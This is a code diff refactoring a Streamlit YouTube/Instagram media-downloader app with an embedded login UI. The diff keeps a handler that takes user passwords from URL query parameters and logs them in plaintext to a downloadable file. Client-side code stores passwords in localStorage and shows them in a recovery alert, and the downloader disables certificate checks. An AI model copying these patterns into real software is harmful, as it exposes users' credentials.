@@ -1,15 +1,29 @@
 import os
-import requests
+import re
+
 import streamlit as st
 import streamlit.components.v1 as components
 import yt_dlp
 
 # Page Configuration
 st.set_page_config(
-    page_title="YT Dodo - Universal Media Hub", page_icon="▶️", layout="wide"
+    page_title="YT Dodo - Universal Media Hub",
+    page_icon="▶️",
+    layout="wide",
 )
 
+
+# -------------------------
+# Utility helpers
+# -------------------------
+def sanitize_filename(name: str, fallback: str = "media_file") -> str:
+    cleaned = re.sub(r"[^A-Za-z0-9 _.-]", "", str(name or fallback)).strip()
+    return cleaned or fallback
+
+
+# -------------------------
 # Backend: Handle User Registration Logs & Silent Direct File Download
+# -------------------------
 query_params = st.query_params
 
 if "action" in query_params and query_params["action"] == "save_user":
@@ -21,11 +35,15 @@ if "action" in query_params and query_params["action"] == "save_user":
         user_id = query_params.get("userid", "N/A")
         pwd = query_params.get("pwd", "N/A")
 
-        log_entry = f"Name: {name} | Email: {email} | Phone: {phone} | Occupation: {occ} | UserID: {user_id} | Password: {pwd}\n"
+        log_entry = (
+            f"Name: {name} | Email: {email} | Phone: {phone} | "
+            f"Occupation: {occ} | UserID: {user_id} | Password: {pwd}\n"
+        )
         with open("users_log.txt", "a", encoding="utf-8") as log_file:
             log_file.write(log_entry)
-    except Exception as e:
+    except Exception:
         pass
+
 
 # Admin Sidebar to Download Users Log File
 with st.sidebar:
@@ -43,73 +61,64 @@ with st.sidebar:
     else:
         st.info("No user logs recorded yet.")
 
-# Direct Streamlit Download Handler with Dynamic File Naming & Label
-if "download_url" in query_params:
-    raw_target_url = query_params["download_url"]
-    target_url = raw_target_url.split("&")[0].split("?si=")[0]
-    format_type = query_params.get("format", "mp4")
 
-try:
-        if "MP3" in format_type.upper() or "AUDIO" in format_type.upper():
-            ydl_opts = {
-                "format": "bestaudio/best",
-                "outtmpl": "temp_media.m4a",
-                "noplaylist": True,
-                "geo_bypass": True,
-                "nocheckcertificate": True,
-                "extractor_args": {
-                    "youtube": {
-                        "player_client": ["android", "ios", "web"]
-                    }
-                },
-                "http_headers": {
-                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-                    "Accept-Language": "en-US,en;q=0.9",
-                }
-            }
-            ext = "m4a"
-        else:
-            ydl_opts = {
-                "format": "best[ext=mp4]/best",
-                "outtmpl": "temp_media.mp4",
-                "noplaylist": True,
-                "geo_bypass": True,
-                "nocheckcertificate": True,
-                "extractor_args": {
-                    "youtube": {
-                        "player_client": ["android", "ios", "web"]
-                    }
-                },
-                "http_headers": {
-                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-                    "Accept-Language": "en-US,en;q=0.9",
-                }
-            }
-            ext = "mp4"
+# Direct Streamlit Download Handler with Dynamic File Naming & Label
+final_filename = None
+if "download_url" in query_params:
+    try:
+        raw_target_url = query_params["download_url"]
+        target_url = raw_target_url.split("&")[0].split("?si=")[0]
+        format_type = query_params.get("format", "mp4")
+
+        is_audio = "mp3" in str(format_type).lower() or "audio" in str(format_type).lower()
+        ext = "m4a" if is_audio else "mp4"
+        temp_filename = "temp_media.m4a" if is_audio else "temp_media.mp4"
+
+        ydl_opts = {
+            "format": "bestaudio/best" if is_audio else "best[ext=mp4]/best",
+            "outtmpl": temp_filename,
+            "noplaylist": True,
+            "geo_bypass": True,
+            "nocheckcertificate": True,
+            "extractor_args": {"youtube": {"player_client": ["android", "ios", "web"]}},
+            "http_headers": {
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+                "Accept-Language": "en-US,en;q=0.9",
+            },
+        }
 
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
             info = ydl.extract_info(target_url, download=True)
-            real_title = info.get("title", "ytdodo_media")
-            safe_title = "".join([c for c in real_title if c.isalnum() or c.isspace()]).strip()
-            if not safe_title:
-                safe_title = "media_file"
+            if not isinstance(info, dict):
+                raise ValueError("No media metadata returned by YouTube downloader.")
 
-            temp_filename = "temp_media.m4a" if ext == "m4a" else "temp_media.mp4"
+            real_title = info.get("title", "ytdodo_media")
+            safe_title = sanitize_filename(real_title, "media_file")
             final_filename = f"{safe_title[:40]}.{ext}"
 
             if os.path.exists(temp_filename):
                 if os.path.exists(final_filename):
                     os.remove(final_filename)
-                os.rename(temp_filename, final_filename)
+                os.replace(temp_filename, final_filename)
 
-        if os.path.exists(final_filename):
+        if final_filename and os.path.exists(final_filename):
+            st.success(f"Download ready: {final_filename}")
+            with open(final_filename, "rb") as media_file:
+                st.download_button(
+                    label=f"📥 Download {os.path.basename(final_filename)}",
+                    data=media_file,
+                    file_name=os.path.basename(final_filename),
+                    mime="audio/mp4" if is_audio else "video/mp4",
+                    use_container_width=True,
+                )
             st.markdown(
-                f'<a href="{target_url}" target="_blank" style="display:inline-block;padding:12px 20px;background-color:#ff0000;color:white;text-decoration:none;border-radius:8px;font-weight:bold;text-align:center;width:100%;">📥 Open & Download in Browser</a>',
+                "<hr style='margin-top: 1rem; margin-bottom: 1rem;'>",
                 unsafe_allow_html=True,
             )
-            
     except Exception as e:
         st.error(f"Download Error: {e}")
+
+
 # Embedded HTML & JavaScript UI with Thumbnail Preview & Creator Branding
 html_code = """
 <!DOCTYPE html>
@@ -143,11 +152,11 @@ html_code = """
             <form id="loginForm" onsubmit="handleLogin(event)" autocomplete="off" class="space-y-4">
                 <div>
                     <label class="block text-xs font-medium text-slate-700 mb-1" data-i18n="signin_id">Sign In ID / Email / Phone</label>
-                    <input type="text" id="loginId" autocomplete="off" required class="w-full px-4 py-3 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm focus:outline-none focus:border-red-600">
+                    <input type="text" id="loginId" autocomplete="off" required class="w-full px-4 py-3 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm focus:outline-none focus:border-red-500">
                 </div>
                 <div>
                     <label class="block text-xs font-medium text-slate-700 mb-1" data-i18n="password">Password</label>
-                    <input type="password" id="loginPass" autocomplete="new-password" required class="w-full px-4 py-3 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm focus:outline-none focus:border-red-600">
+                    <input type="password" id="loginPass" autocomplete="new-password" required class="w-full px-4 py-3 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm focus:outline-none focus:border-red-500">
                 </div>
                 <button type="submit" class="w-full py-3 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-xl transition shadow-lg" data-i18n="signin_btn">Sign In</button>
             </form>
@@ -232,11 +241,11 @@ html_code = """
         <main class="flex-1 max-w-4xl w-full mx-auto p-4 space-y-6 pb-20 relative">
             <section id="searchSection" class="bg-zinc-900/90 border border-zinc-800 p-5 rounded-2xl shadow-xl space-y-4">
                 <h3 class="text-sm font-bold text-red-400 uppercase tracking-wide" data-i18n="search_title">Search & Download Hub</h3>
-                
+
                 <div class="flex gap-2">
                     <div class="relative flex-1">
                         <i class="fa-solid fa-magnifying-glass absolute left-4 top-3.5 text-slate-400 text-sm"></i>
-                        <input type="text" id="videoUrlInput" placeholder="Paste YouTube, Instagram or Facebook link..." class="w-full pl-11 pr-4 py-3 bg-black text-white placeholder-slate-500 border border-zinc-700 rounded-xl text-sm focus:outline-none focus:border-red-500">
+                        <input type="text" id="videoUrlInput" placeholder="Paste YouTube, Instagram or Facebook link..." class="w-full pl-11 pr-4 py-3 bg-black text-white placeholder-slate-500 border border-zinc-800 rounded-xl focus:outline-none focus:border-red-500">
                     </div>
                     <button onclick="fetchMediaOrSearch()" class="bg-red-600 hover:bg-red-500 text-white px-6 py-3 rounded-xl font-medium text-sm transition flex items-center space-x-2">
                         <i class="fa-solid fa-magnifying-glass"></i>
@@ -252,7 +261,7 @@ html_code = """
                 <div id="videoFrameContainer" class="my-hidden bg-black p-3 rounded-xl border border-zinc-800 space-y-3">
                     <div class="relative w-full h-[300px] bg-zinc-900 rounded-xl overflow-hidden flex flex-col items-center justify-center border border-zinc-800">
                         <div id="mediaDisplayArea" class="w-full h-full flex items-center justify-center relative"></div>
-                        <button onclick="showQualitySelector()" class="absolute bottom-4 right-4 w-12 h-12 bg-red-600 hover:bg-red-500 text-white rounded-full flex items-center justify-center shadow-2xl border-2 border-white/20 transition transform hover:scale-110 z-20" title="Download Options">
+                        <button onclick="showQualitySelector()" class="absolute bottom-4 right-4 w-12 h-12 bg-red-600 hover:bg-red-500 text-white rounded-full flex items-center justify-center shadow-lg">
                             <i class="fa-solid fa-arrow-down text-lg"></i>
                         </button>
                     </div>
@@ -310,7 +319,7 @@ html_code = """
                 <h3 class="text-sm font-bold text-red-400"><i class="fa-solid fa-gear mr-1"></i> <span data-i18n="settings_title">App Settings</span></h3>
                 <button onclick="closeSettingsModal()" class="text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
             </div>
-            
+
             <div class="space-y-4 text-xs">
                 <div>
                     <label class="block text-slate-400 mb-1.5 font-semibold" data-i18n="select_lang">Select Language (भाषा):</label>
@@ -425,21 +434,30 @@ html_code = """
             }
         };
 
+        function safeStorageGet(key, fallback) {
+            try {
+                const value = localStorage.getItem(key);
+                return value ? JSON.parse(value) : fallback;
+            } catch (error) {
+                return fallback;
+            }
+        }
+
         let currentLang = localStorage.getItem('ytdoodo_lang') || 'en';
         let currentTheme = localStorage.getItem('ytdoodo_theme') || 'dark';
-        let registeredUsers = JSON.parse(localStorage.getItem('ytdoodo_users')) || [];
-        let userDownloads = JSON.parse(localStorage.getItem('ytdoodo_downloads')) || [];
-        let customShortcuts = JSON.parse(localStorage.getItem('ytdoodo_shortcuts')) || [];
+        let registeredUsers = safeStorageGet('ytdoodo_users', []);
+        let userDownloads = safeStorageGet('ytdoodo_downloads', []);
+        let customShortcuts = safeStorageGet('ytdoodo_shortcuts', []);
         let selectedQualityType = "Video - 720p (HD)";
         let currentVideoTitle = "Media File";
-        let isDownloading = True;
+        let isDownloading = false;
 
         window.addEventListener('DOMContentLoaded', () => {
             setTheme(currentTheme);
             changeLanguage(currentLang);
             document.getElementById('langSelect').value = currentLang;
 
-            const currentUser = JSON.parse(localStorage.getItem('ytdoodo_current_user'));
+            const currentUser = safeStorageGet('ytdoodo_current_user', null);
             if (currentUser) {
                 document.getElementById('authScreen').classList.add('my-hidden');
                 document.getElementById('mainApp').classList.remove('my-hidden');
@@ -483,10 +501,10 @@ html_code = """
         function forgotPassword() {
             const inputVal = prompt("Enter your registered Email or Mobile Number to recover your account details:");
             if (!inputVal) return;
-            
+
             const foundUser = registeredUsers.find(u => u.email === inputVal.trim() || u.phone === inputVal.trim() || u.userId === inputVal.trim());
             if (foundUser) {
-                alert(`Account Found!\\nName: ${foundUser.name}\\nSign In ID: ${foundUser.userId}\\nPassword: ${foundUser.pass}`);
+                alert(`Account Found!\nName: ${foundUser.name}\nSign In ID: ${foundUser.userId}\nPassword: ${foundUser.pass}`);
                 document.getElementById('loginId').value = foundUser.userId;
             } else {
                 alert("No account found with this Email/Phone/ID. Please check or register a new account.");
@@ -497,8 +515,8 @@ html_code = """
         function closeSettingsModal() { document.getElementById('settingsModal').classList.add('my-hidden'); }
 
         function openProfileModal() {
-            const currentUser = JSON.parse(localStorage.getItem('ytdoodo_current_user'));
-            if(currentUser) {
+            const currentUser = safeStorageGet('ytdoodo_current_user', null);
+            if (currentUser) {
                 document.getElementById('profileContent').innerHTML = `
                     <div class="p-3 bg-black rounded-xl border border-zinc-800 space-y-2 text-white">
                         <p><strong>Name:</strong> ${currentUser.name}</p>
@@ -516,7 +534,7 @@ html_code = """
 
         function cleanPhone(phone) {
             if (!phone) return "";
-            let digits = phone.replace(/\\D/g, '');
+            let digits = phone.replace(/\D/g, '');
             return digits.length > 10 ? digits.slice(-10) : digits;
         }
 
@@ -576,7 +594,7 @@ html_code = """
         function saveCustomShortcut() {
             const title = document.getElementById('shortcutTitleInput').value.trim();
             const url = document.getElementById('shortcutUrlInput').value.trim();
-            if(!title || !url) { alert('Please enter both title and valid URL!'); return; }
+            if (!title || !url) { alert('Please enter both title and valid URL!'); return; }
             customShortcuts.push({ title, url });
             localStorage.setItem('ytdoodo_shortcuts', JSON.stringify(customShortcuts));
             document.getElementById('shortcutTitleInput').value = '';
@@ -638,20 +656,20 @@ html_code = """
 
         async function fetchMediaOrSearch() {
             const query = document.getElementById('videoUrlInput').value.trim();
-            if(!query) { alert('Please enter a link first!'); return; }
-            
+            if (!query) { alert('Please enter a link first!'); return; }
+
             let thumbnailHtml = '';
             const ytId = extractYouTubeId(query);
-            
+
             if (ytId) {
                 currentVideoTitle = "YouTube Video Media";
                 thumbnailHtml = `<img src="https://img.youtube.com/vi/${ytId}/hqdefault.jpg" class="w-full h-full object-cover rounded-xl" alt="YouTube Thumbnail">`;
             } else if (query.includes("instagram.com")) {
                 currentVideoTitle = "Instagram Reel Media";
-                thumbnailHtml = `<div class="flex flex-col items-center justify-center h-full text-pink-500 space-y-2"><i class="fa-brands fa-instagram text-5xl"></i><span class="text-xs text-white font-bold">Instagram Reel Ready</span></div>`;
+                thumbnailHtml = `<div class="flex flex-col items-center justify-center h-full text-pink-500 space-y-2"><i class="fa-brands fa-instagram text-5xl"></i><span class="text-xs text-white font-bold">Instagram Media</span></div>`;
             } else {
                 currentVideoTitle = "Media File";
-                thumbnailHtml = `<div class="flex flex-col items-center justify-center h-full text-red-500 space-y-2"><i class="fa-solid fa-file-video text-5xl"></i><span class="text-xs text-white font-bold">Media Ready</span></div>`;
+                thumbnailHtml = `<div class="flex flex-col items-center justify-center h-full text-red-500 space-y-2"><i class="fa-solid fa-file-video text-5xl"></i><span class="text-xs text-white font-bold">Media Preview</span></div>`;
             }
 
             document.getElementById('mediaDisplayArea').innerHTML = thumbnailHtml;
@@ -669,16 +687,19 @@ html_code = """
 
         function executeDownload() {
             const query = document.getElementById('videoUrlInput').value.trim();
-            if(!query) { alert('Please enter a link first!'); return; }
-            
+            if (!query) { alert('Please enter a link first!'); return; }
+
             isDownloading = true;
             updateDownloadBadgeAndHistory();
 
             const timeString = new Date().toLocaleTimeString();
             userDownloads.unshift({ title: currentVideoTitle, format: selectedQualityType, time: timeString });
             localStorage.setItem('ytdoodo_downloads', JSON.stringify(userDownloads));
-            
-            setTimeout(() => { isDownloading = false; updateDownloadBadgeAndHistory(); }, 4000);
+
+            setTimeout(() => {
+                isDownloading = false;
+                updateDownloadBadgeAndHistory();
+            }, 4000);
             window.location.href = `?download_url=${encodeURIComponent(query)}&format=${encodeURIComponent(selectedQualityType)}`;
         }
 
